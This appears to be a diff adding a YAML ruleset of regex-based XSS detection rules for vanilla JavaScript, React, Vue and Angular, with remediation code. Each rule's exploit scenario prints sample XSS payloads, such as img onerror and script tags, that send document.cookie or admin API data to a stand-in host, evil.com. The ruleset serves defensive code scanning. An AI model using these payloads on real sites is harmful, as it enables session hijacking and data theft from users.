@@ -1,0 +1,1534 @@
+# ============================================================================
+# XSS Detection Rules - JavaScript / TypeScript
+# Ruleset Version: 3.0.0
+# Last Updated: 2025-01-15
+# Category: Cross-Site Scripting (CWE-79)
+# Language: JavaScript / TypeScript (React, Vue, Angular, vanilla DOM)
+# ============================================================================
+
+rules:
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-001: innerHTML Assignment with User Input
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-001
+    title: innerHTML Assignment with User-Controlled Data
+    description: >
+      Detects assignment of user-controlled data to Element.innerHTML or
+      Element.outerHTML properties. innerHTML parses and executes any embedded
+      script tags, event handlers, and javascript: URIs. This is the most common
+      DOM-based XSS vector in vanilla JavaScript applications and remains
+      prevalent in legacy codebases and jQuery-to-vanilla migrations.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.93
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, dom-xss, innerHTML, client-side, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '\.innerHTML\s*=\s*[^;]{0,100}(?:request|req|query|param|input|search|hash|location|document\.URL|document\.referrer|window\.name)\b'
+        description: "innerHTML assigned from request or location source"
+      - type: regex
+        pattern: '\.innerHTML\s*=\s*[^;]{0,80}(?:getElementById|querySelector|getElementsBy)\s*\([^)]*\)\.(?:value|textContent|innerText|innerHTML)\b'
+        description: "innerHTML assigned from another DOM element value"
+      - type: regex
+        pattern: '\.innerHTML\s*(?:\+|=)\s*[`''"]\s*<.*?\$\{.*?\}.*?>'
+        description: "innerHTML with template literal containing interpolation in HTML tags"
+      - type: regex
+        pattern: '\.innerHTML\s*=\s*.*?(?:\.searchParams|\.hash|\.search|\.pathname|URLSearchParams)'
+        description: "innerHTML assigned from URL parameters"
+      - type: regex
+        pattern: '\.outerHTML\s*=\s*(?:.*(?:req|param|input|query|user|data|body|args))'
+        description: "outerHTML assigned from user-controlled variable"
+      - type: regex
+        pattern: '\.innerHTML\s*=\s*(?:response|res|data|result|json|payload|body|content)[\.\[]'
+        description: "innerHTML assigned from API response data"
+      - type: regex
+        pattern: '\.innerHTML\s*\+=\s*(?![''\"]<(?:br|hr|p)\s*/?>[''\"])'
+        description: "innerHTML concatenation append (not simple safe tags)"
+    anti_patterns:
+      - 'DOMPurify'
+      - 'sanitize'
+      - 'sanitizeHtml'
+      - 'xss-filters'
+      - 'escape'
+      - 'encodeHTML'
+      - 'textContent'
+      - 'createTextNode'
+      - 'innerText'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+    bypass_variants:
+      - description: "innerHTML via bracket notation"
+        pattern: 'element\s*\[\s*[''"]innerHTML[''"]s*\]\s*=\s*'
+      - description: "insertAdjacentHTML as innerHTML alternative"
+        pattern: '\.insertAdjacentHTML\s*\(\s*[''"](?:beforeend|afterbegin|beforebegin|afterend)[''"].*?(?:param|input|query|user|data)'
+      - description: "DOM Range.createContextualFragment"
+        pattern: '\.createContextualFragment\s*\(\s*(?:.*(?:user|input|data|query|param))'
+    evasion_indicators:
+      - "innerHTML assigned via bracket property access"
+      - "insertAdjacentHTML used as innerHTML alternative"
+      - "DOM Range used to parse untrusted HTML"
+      - "Template literals with HTML and interpolation"
+    encoding_variants:
+      - type: "direct_assignment"
+        pattern: '\.innerHTML\s*=\s*[^;]+(?:param|input|query)'
+      - type: "concatenation"
+        pattern: '\.innerHTML\s*\+=\s*[^;]+(?:param|input|query)'
+      - type: "template_literal"
+        pattern: '\.innerHTML\s*=\s*`[^`]*\$\{[^}]*\}[^`]*`'
+    multi_function_chain_patterns:
+      - "fetch() -> response.json() -> element.innerHTML = data.html"
+      - "location.hash -> decodeURIComponent -> element.innerHTML = decoded"
+      - "URLSearchParams.get() -> innerHTML = param"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "DOM XSS via innerHTML enables session theft and account takeover"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "location.hash"
+        sink: "element.innerHTML"
+        through: "string_concatenation"
+      - source: "URLSearchParams"
+        sink: "element.innerHTML"
+        through: "template_literal"
+      - source: "fetch_response"
+        sink: "element.innerHTML"
+        through: "json_data_field"
+    impact: |
+      innerHTML with user input enables DOM-based XSS:
+      - Session cookie theft via document.cookie exfiltration
+      - Keylogging and credential theft
+      - Defacement and phishing overlay injection
+      - Cryptocurrency mining in victim's browser
+    remediation: |
+      ```javascript
+      // SECURE: Use textContent for text-only insertion
+      element.textContent = userInput;
+
+      // SECURE: Use DOMPurify for HTML content
+      import DOMPurify from 'dompurify';
+      element.innerHTML = DOMPurify.sanitize(untrustedHTML);
+
+      // SECURE: Use DOM APIs to build elements
+      const el = document.createElement('div');
+      el.textContent = userInput;
+      container.appendChild(el);
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+      - "https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations"
+    context_awareness:
+      surrounding_context_patterns: ['innerHTML', 'outerHTML', 'document.getElementById', 'querySelector']
+      taint_source_indicators: ['location.hash', 'location.search', 'URLSearchParams', 'document.referrer']
+      taint_sink_indicators: ['innerHTML', 'outerHTML', 'insertAdjacentHTML']
+      sanitization_patterns: ['DOMPurify.sanitize', 'textContent', 'createTextNode', 'encodeHTML']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + user_input_proximity)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        DOM XSS via innerHTML from URL hash:
+        https://target.com/page#<img src=x onerror=document.location='https://evil.com/steal?c='+document.cookie>
+        element.innerHTML = location.hash.slice(1);
+      example_payload: "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"
+      attacker_objective: "Execute arbitrary JavaScript via DOM-based XSS"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-002, XSS-JS-003]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-002: document.write with User Input
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-002
+    title: document.write with User-Controlled Data
+    description: >
+      Detects usage of document.write() and document.writeln() with user-controlled
+      data. These methods insert raw HTML into the document stream. When called
+      after the document has loaded, document.write replaces the entire page.
+      They are a classic XSS sink that is trivially exploitable with any unescaped
+      user input containing HTML or script tags.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.94
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, dom-xss, document-write, legacy, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'document\.write\s*\(\s*(?:.*(?:location|document\.URL|document\.referrer|window\.name|document\.cookie))'
+        description: "document.write with location or document source"
+      - type: regex
+        pattern: 'document\.write\s*\(\s*(?:.*(?:param|input|query|search|hash|user|data|content))'
+        description: "document.write with user-controlled variable"
+      - type: regex
+        pattern: 'document\.writeln\s*\(\s*(?:.*(?:param|input|query|user|data|content|request))'
+        description: "document.writeln with user-controlled data"
+      - type: regex
+        pattern: 'document\.write\s*\(\s*[`''"]<.*?\$\{.*?\}.*?>'
+        description: "document.write with template literal and HTML interpolation"
+      - type: regex
+        pattern: 'document\.write\s*\(\s*[''"]<\w+[^>]*[''"].*?\+.*?(?:param|input|data|query|user)'
+        description: "document.write concatenating HTML with user input"
+      - type: regex
+        pattern: 'document\.write\s*\(\s*(?:unescape|decodeURIComponent|atob)\s*\('
+        description: "document.write with decoded / unescaped data"
+    anti_patterns:
+      - 'DOMPurify'
+      - 'sanitize'
+      - 'escape'
+      - 'encodeHTML'
+      - 'textContent'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'document.write.*<script.*src'
+      - 'google.*analytics'
+      - 'gtag'
+    bypass_variants:
+      - description: "document.write via variable reference"
+        pattern: '(?:const|let|var)\s+\w+\s*=\s*document\.write\s*;\s*\w+\s*\('
+      - description: "eval constructing document.write call"
+        pattern: 'eval\s*\(\s*[''"]document\.write'
+      - description: "document.write in setTimeout/setInterval"
+        pattern: '(?:setTimeout|setInterval)\s*\(\s*[''"]document\.write'
+    evasion_indicators:
+      - "document.write called via function alias"
+      - "document.write invoked through eval"
+      - "document.write in timer callback string"
+      - "document.write with decoded input"
+    encoding_variants:
+      - type: "direct_call"
+        pattern: 'document\.write\s*\(\s*[^)]*(?:param|user|data)'
+      - type: "concatenation"
+        pattern: 'document\.write\s*\(\s*[''"][^'']*[''"].*?\+.*?\)'
+      - type: "template_literal"
+        pattern: 'document\.write\s*\(\s*`[^`]*\$\{[^}]*\}'
+    multi_function_chain_patterns:
+      - "location.search -> decodeURIComponent -> document.write(decoded)"
+      - "XMLHttpRequest -> responseText -> document.write(response)"
+      - "window.name -> document.write(name)"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "document.write XSS enables full page takeover"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "location.search"
+        sink: "document.write"
+        through: "string_concatenation"
+      - source: "window.name"
+        sink: "document.write"
+        through: "direct_pass"
+      - source: "document.referrer"
+        sink: "document.write"
+        through: "template_literal"
+    impact: |
+      document.write with user input enables immediate XSS:
+      - Full page content replacement after loading
+      - Script injection and execution
+      - Session hijacking and credential theft
+      - Drive-by download attacks
+    remediation: |
+      ```javascript
+      // AVOID: document.write is discouraged entirely
+      // SECURE: Use DOM APIs instead
+      const el = document.createElement('div');
+      el.textContent = userInput;
+      document.body.appendChild(el);
+
+      // For dynamic content, use sanitization
+      import DOMPurify from 'dompurify';
+      element.innerHTML = DOMPurify.sanitize(untrustedContent);
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://developer.mozilla.org/en-US/docs/Web/API/Document/write"
+    context_awareness:
+      surrounding_context_patterns: ['document.write', 'document.writeln', 'document.open']
+      taint_source_indicators: ['location', 'document.URL', 'document.referrer', 'window.name']
+      taint_sink_indicators: ['document.write', 'document.writeln']
+      sanitization_patterns: ['DOMPurify', 'encodeHTML', 'textContent', 'createElement']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + sink_severity)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        document.write with URL parameter:
+        URL: https://target.com/page?name=<script>fetch('https://evil.com?c='+document.cookie)</script>
+        Code: document.write('Hello ' + new URLSearchParams(location.search).get('name'));
+      example_payload: "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
+      attacker_objective: "Inject script via document.write for DOM XSS"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-001, XSS-JS-005]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-003: React dangerouslySetInnerHTML
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-003
+    title: React dangerouslySetInnerHTML with Unsanitized Input
+    description: >
+      Detects usage of React's dangerouslySetInnerHTML prop with user-controlled
+      or unsanitized data. React intentionally named this prop to signal danger.
+      When used with unsanitized input, it bypasses React's built-in XSS protection
+      and allows injection of arbitrary HTML and JavaScript into the virtual DOM.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.92
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, react, dangerouslySetInnerHTML, jsx, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:props|state|data|user|content|body|result|response|param|input)[\.\[]'
+        description: "dangerouslySetInnerHTML with user-controlled data source"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?!DOMPurify|sanitize|purify|clean)\w+'
+        description: "dangerouslySetInnerHTML with unsanitized variable"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*`[^`]*\$\{'
+        description: "dangerouslySetInnerHTML with template literal interpolation"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*[''"].*?\+\s*(?:props|state|data)'
+        description: "dangerouslySetInnerHTML with string concatenation of props/state"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\w+\s*\}'
+        description: "dangerouslySetInnerHTML with variable object (may contain __html)"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*createMarkup\s*\(\s*(?!.*sanitize)(?:props|state|data|user|content)'
+        description: "dangerouslySetInnerHTML with createMarkup helper passing user data"
+    anti_patterns:
+      - 'DOMPurify'
+      - 'sanitize'
+      - 'sanitizeHtml'
+      - 'purify'
+      - 'xss'
+      - 'isomorphic-dompurify'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - '.stories.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'storybook'
+    bypass_variants:
+      - description: "createMarkup wrapper without sanitization"
+        pattern: 'function\s+createMarkup\s*\(\s*\w+\s*\)\s*\{\s*return\s*\{\s*__html\s*:\s*\w+\s*\}'
+      - description: "dangerouslySetInnerHTML from API response without sanitization"
+        pattern: 'fetch\s*\([^)]+\)[^}]*\.then[^}]*dangerouslySetInnerHTML'
+      - description: "Server-rendered HTML passed as prop and set via dangerouslySetInnerHTML"
+        pattern: '(?:getServerSideProps|getStaticProps)[^}]*html[^}]*dangerouslySetInnerHTML'
+    evasion_indicators:
+      - "createMarkup helper hiding dangerouslySetInnerHTML usage"
+      - "API response directly passed to dangerouslySetInnerHTML"
+      - "Server-rendered HTML inserted without client-side sanitization"
+      - "Markdown renderer output passed to dangerouslySetInnerHTML"
+    encoding_variants:
+      - type: "direct_prop"
+        pattern: 'dangerouslySetInnerHTML=\{\{__html:\s*\w+\}\}'
+      - type: "helper_function"
+        pattern: 'dangerouslySetInnerHTML=\{createMarkup\('
+      - type: "spread_props"
+        pattern: '\.\.\.\w+.*dangerouslySetInnerHTML'
+    multi_function_chain_patterns:
+      - "fetch() -> json() -> setState({html: data.content}) -> dangerouslySetInnerHTML={html}"
+      - "props.content -> createMarkup(content) -> dangerouslySetInnerHTML"
+      - "markdown.render(userInput) -> dangerouslySetInnerHTML"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "React XSS via dangerouslySetInnerHTML bypasses virtual DOM protection"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "props.content"
+        sink: "dangerouslySetInnerHTML.__html"
+        through: "direct_assignment"
+      - source: "api_response"
+        sink: "dangerouslySetInnerHTML"
+        through: "state_update"
+      - source: "user_generated_html"
+        sink: "dangerouslySetInnerHTML"
+        through: "markdown_render"
+    impact: |
+      dangerouslySetInnerHTML with unsanitized data enables XSS in React apps:
+      - Bypasses React's built-in XSS protection
+      - Stored XSS when user-generated HTML rendered from database
+      - DOM manipulation and session hijacking
+      - Phishing overlays in single-page applications
+    remediation: |
+      ```jsx
+      import DOMPurify from 'dompurify';
+
+      // SECURE: Sanitize before using dangerouslySetInnerHTML
+      function SafeHTML({ html }) {
+        return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
+      }
+
+      // BETTER: Avoid dangerouslySetInnerHTML entirely
+      // Use a safe markdown renderer or React components for dynamic content
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html"
+    context_awareness:
+      surrounding_context_patterns: ['React', 'jsx', 'tsx', 'dangerouslySetInnerHTML', 'component']
+      taint_source_indicators: ['props.', 'state.', 'data.', 'response.', 'useQuery']
+      taint_sink_indicators: ['dangerouslySetInnerHTML', '__html']
+      sanitization_patterns: ['DOMPurify.sanitize', 'sanitizeHtml', 'isomorphic-dompurify']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + react_app_exposure)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        React component rendering user bio from API:
+        <div dangerouslySetInnerHTML={{ __html: user.bio }} />
+        Attacker sets bio to: <img src=x onerror="fetch('/api/admin',{headers:{'Cookie':document.cookie}})">
+      example_payload: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
+      attacker_objective: "Exploit stored XSS via dangerouslySetInnerHTML in React"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-001, XSS-JS-004]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-004: Vue v-html Directive with Unsanitized Input
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-004
+    title: Vue v-html Directive with Unsanitized Input
+    description: >
+      Detects usage of Vue.js's v-html directive with user-controlled or unsanitized
+      data. The v-html directive renders raw HTML and does not apply any sanitization.
+      Vue's documentation explicitly warns that v-html should never be used on
+      user-provided content as it can easily lead to XSS vulnerabilities.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.91
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, vue, v-html, template, javascript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'v-html\s*=\s*"(?:user|content|data|body|html|message|comment|post|bio|description|input|param)\w*"'
+        description: "v-html bound to user-controlled data property"
+      - type: regex
+        pattern: 'v-html\s*=\s*"(?:item|record|row|entry|result)\.\w*(?:html|content|body|text|description)"'
+        description: "v-html bound to object property with content-like name"
+      - type: regex
+        pattern: 'v-html\s*=\s*"(?:\$route\.query|\$route\.params|\$route\.hash)'
+        description: "v-html bound to Vue router query/params"
+      - type: regex
+        pattern: '\$el\.innerHTML\s*=|this\.\$refs\.\w+\.innerHTML\s*='
+        description: "Vue component setting innerHTML via $el or $refs"
+      - type: regex
+        pattern: 'v-html\s*=\s*"(?:.*(?:fetch|axios|api|http|response|res))'
+        description: "v-html bound to API response data"
+      - type: regex
+        pattern: 'h\s*\(\s*[''"]div[''"].*?innerHTML\s*:\s*(?:props|data|this\.)'
+        description: "Vue render function with innerHTML property"
+    anti_patterns:
+      - 'DOMPurify'
+      - 'sanitize'
+      - 'vue-sanitize'
+      - 'vue-dompurify'
+      - 'xss-filters'
+      - 'escape'
+      - '.test.'
+      - '__tests__'
+      - 'spec.'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'vitest'
+      - 'stories.'
+    bypass_variants:
+      - description: "Computed property wrapping unsanitized HTML"
+        pattern: 'computed\s*:\s*\{[^}]*\w+HTML\s*\(\s*\)\s*\{[^}]*return\s+(?:this\.)?(?:content|data|user)(?![^}]*sanitize)'
+      - description: "Vue filter processing HTML without sanitization"
+        pattern: 'filters\s*:\s*\{[^}]*\w+\s*\(\s*\w+\s*\)\s*\{[^}]*return\s+(?!.*sanitize).*\}'
+      - description: "Vuex store state rendered via v-html"
+        pattern: 'mapState|mapGetters.*v-html\s*=\s*"\w+\.html'
+    evasion_indicators:
+      - "Computed property returning unsanitized HTML"
+      - "Vue filter processing HTML without sanitization"
+      - "Vuex store state rendered directly with v-html"
+      - "Vue $refs used to set innerHTML bypassing template"
+    encoding_variants:
+      - type: "template_directive"
+        pattern: 'v-html\s*=\s*"[^"]*(?:content|data|html)"'
+      - type: "render_function"
+        pattern: 'innerHTML\s*:\s*(?:this\.)?(?:data|content)'
+      - type: "jsx_vue"
+        pattern: 'domPropsInnerHTML\s*=\s*\{'
+    multi_function_chain_patterns:
+      - "axios.get() -> store.commit(html) -> v-html='storeHtml'"
+      - "$route.query.content -> computed property -> v-html"
+      - "user.bio from API -> v-html='user.bio'"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Vue v-html XSS bypasses Vue template encoding"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "api_response"
+        sink: "v-html_directive"
+        through: "data_property"
+      - source: "route_query"
+        sink: "v-html"
+        through: "computed_property"
+      - source: "user_generated_content"
+        sink: "v-html"
+        through: "vuex_state"
+    impact: |
+      v-html with unsanitized input enables XSS in Vue applications:
+      - Stored XSS from database-sourced HTML content
+      - Reflected XSS via Vue router query parameters
+      - Component-level XSS affecting all instances
+      - SPA session hijacking
+    remediation: |
+      ```vue
+      <template>
+        <!-- INSECURE: Never use v-html with user data -->
+        <!-- <div v-html="userContent"></div> -->
+
+        <!-- SECURE: Use v-text or template interpolation for text -->
+        <div v-text="userContent"></div>
+
+        <!-- SECURE: Sanitize if HTML rendering is required -->
+        <div v-html="sanitizedContent"></div>
+      </template>
+      <script>
+      import DOMPurify from 'dompurify';
+      export default {
+        computed: {
+          sanitizedContent() {
+            return DOMPurify.sanitize(this.userContent);
+          }
+        }
+      }
+      </script>
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://vuejs.org/api/built-in-directives.html#v-html"
+    context_awareness:
+      surrounding_context_patterns: ['v-html', 'Vue', '.vue', 'template', 'component']
+      taint_source_indicators: ['$route.query', '$route.params', 'axios', 'fetch', 'props']
+      taint_sink_indicators: ['v-html', 'innerHTML', 'domPropsInnerHTML']
+      sanitization_patterns: ['DOMPurify', 'vue-sanitize', 'sanitize', 'v-text']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + vue_app_scope)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Vue component rendering user comment with v-html:
+        <div v-html="comment.body"></div>
+        Attacker submits comment: <img src=x onerror="new Image().src='https://evil.com/?c='+document.cookie">
+      example_payload: "<svg onload=fetch('https://evil.com/steal?cookie='+document.cookie)>"
+      attacker_objective: "Exploit stored XSS via Vue v-html directive"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-JS-003, XSS-JS-005]
+
+  # --------------------------------------------------------------------------
+  # XSS-JS-005: Angular bypassSecurityTrust Methods
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-JS-005
+    title: Angular bypassSecurityTrust with Unsanitized Input
+    description: >
+      Detects usage of Angular's DomSanitizer bypass methods including
+      bypassSecurityTrustHtml, bypassSecurityTrustScript, bypassSecurityTrustUrl,
+      bypassSecurityTrustResourceUrl, and bypassSecurityTrustStyle with user-controlled
+      data. These methods explicitly disable Angular's built-in XSS protection
+      and should only be used with verified safe content.
+    language: javascript
+    category: xss
+    severity: High
+    confidence: 0.93
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, angular, bypassSecurityTrust, domSanitizer, typescript]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'bypassSecurityTrustHtml\s*\(\s*(?:.*(?:user|input|param|data|content|body|html|comment|post|response))'
+        description: "bypassSecurityTrustHtml with user-controlled data"
+      - type: regex
+        pattern: 'bypassSecurityTrustScript\s*\(\s*(?:.*(?:user|input|param|data|code|script|eval))'
+        description: "bypassSecurityTrustScript with user-controlled data"
+      - type: regex
+        pattern: 'bypassSecurityTrustUrl\s*\(\s*(?:.*(?:user|input|param|data|url|href|link|redirect))'
+        description: "bypassSecurityTrustUrl with user-controlled URL"
+      - type: regex
+        pattern: 'bypassSecurityTrustResourceUrl\s*\(\s*(?:.*(?:user|input|param|data|url|src|iframe|embed))'
+        description: "bypassSecurityTrustResourceUrl with user-controlled URL"
+      - type: regex
+        pattern: 'bypassSecurityTrustStyle\s*\(\s*(?:.*(?:user|input|param|data|style|css|color))'
+        description: "bypassSecurityTrustStyle with user-controlled CSS"
+      - type: regex
+        pattern: '(?:pipe|transform)\s*\([^)]*\)\s*\{[^}]*bypassSecurityTrust\w+\s*\([^)]*\)'
+        description: "Angular pipe using bypassSecurityTrust without sanitization"
+      - type: regex
+        pattern: '\[innerHTML\]\s*=\s*"(?:user|content|data|body|html|message|comment)\w*"'
+        description: "Angular innerHTML binding with user-controlled property"
+    anti_patterns:
+      - 'DOMPurify'
+      - 'sanitize'
+      - 'sanitizer'
+      - 'SafeHtml.*check'
+      - 'validate'
+      - '.spec.'
+      - '.test.'
+      - '__tests__'
+      - 'mock'
+      - 'fixture'
+      - 'jest'
+      - 'jasmine'
+      - 'karma'
+      - 'TestBed'
+    bypass_variants:
+      - description: "Custom pipe wrapping bypassSecurityTrust without sanitization"
+        pattern: '@Pipe\s*\([^)]*\)[^}]*implements\s+PipeTransform[^}]*bypassSecurityTrust\w+\s*\([^)]*\)\s*;?\s*\}'
+      - description: "DomSanitizer injected but used to bypass on all content"
+        pattern: 'constructor\s*\(\s*private\s+sanitizer\s*:\s*DomSanitizer\s*\)[^}]*bypassSecurityTrust\w+\s*\(\s*(?:this\.)?(?:content|data|html)'
+      - description: "Angular component binding with interpolation in [innerHTML]"
+        pattern: '\[innerHTML\]\s*=\s*".*\+.*(?:user|input|param|data)"'
+    evasion_indicators:
+      - "Custom pipe hiding bypassSecurityTrust usage"
+      - "DomSanitizer bypass applied globally in service"
+      - "innerHTML binding with user-controlled interpolation"
+      - "bypassSecurityTrustResourceUrl allowing iframe injection"
+    encoding_variants:
+      - type: "trust_html"
+        pattern: 'bypassSecurityTrustHtml\s*\(\s*\w+'
+      - type: "trust_url"
+        pattern: 'bypassSecurityTrustUrl\s*\(\s*\w+'
+      - type: "innerHTML_binding"
+        pattern: '\[innerHTML\]\s*=\s*"[^"]*user[^"]*"'
+    multi_function_chain_patterns:
+      - "API response -> service method -> bypassSecurityTrustHtml -> [innerHTML] binding"
+      - "route.params -> component property -> safeHtml pipe -> bypassSecurityTrustHtml"
+      - "user.profile.bio -> bypassSecurityTrustHtml -> template display"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Angular security bypass enables XSS in protected framework"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "api_response"
+        sink: "bypassSecurityTrustHtml"
+        through: "service_method"
+      - source: "route_params"
+        sink: "bypassSecurityTrustUrl"
+        through: "component_property"
+      - source: "user_input"
+        sink: "bypassSecurityTrustScript"
+        through: "pipe_transform"
+    impact: |
+      Angular security bypass methods disable framework XSS protection:
+      - Script injection via bypassSecurityTrustHtml
+      - JavaScript URI injection via bypassSecurityTrustUrl
+      - Resource loading from attacker-controlled URLs
+      - CSS injection for data exfiltration
+    remediation: |
+      ```typescript
+      // SECURE: Use Angular's built-in sanitization (default behavior)
+      // Angular automatically sanitizes [innerHTML] bindings
+
+      // If bypass is truly needed, sanitize first
+      import DOMPurify from 'dompurify';
+
+      @Pipe({ name: 'safeHtml' })
+      export class SafeHtmlPipe implements PipeTransform {
+        constructor(private sanitizer: DomSanitizer) {}
+        transform(value: string): SafeHtml {
+          const clean = DOMPurify.sanitize(value);
+          return this.sanitizer.bypassSecurityTrustHtml(clean);
+        }
+      }
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://angular.io/guide/security#sanitization-and-security-contexts"
+    context_awareness:
+      surrounding_context_patterns: ['DomSanitizer', 'bypassSecurityTrust', 'Angular', '@Component', '@Pipe']
+      taint_source_indicators: ['ActivatedRoute', 'HttpClient', '@Input', 'route.params']
+      taint_sink_indicators: ['bypassSecurityTrustHtml', 'bypassSecurityTrustUrl', 'bypassSecurityTrustScript']
+      sanitization_patterns: ['DOMPurify', 'Angular built-in sanitizer', 'sanitize']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + bypass_method_severity)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Angular component with bypassSecurityTrustHtml on user profile:
+        this.sanitizer.bypassSecurityTrustHtml(user.bio);
+        Attacker sets bio: <img src=x onerror="fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('https://evil.com',{method:'POST',body:JSON.stringify(d)}))">
+      example_payload: "<img src=x onerror=fetch('https://evil.com?cookie='+document.cookie)>"
+      attacker_objective: "Exploit Angular bypassSecurityTrust for stored XSS"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
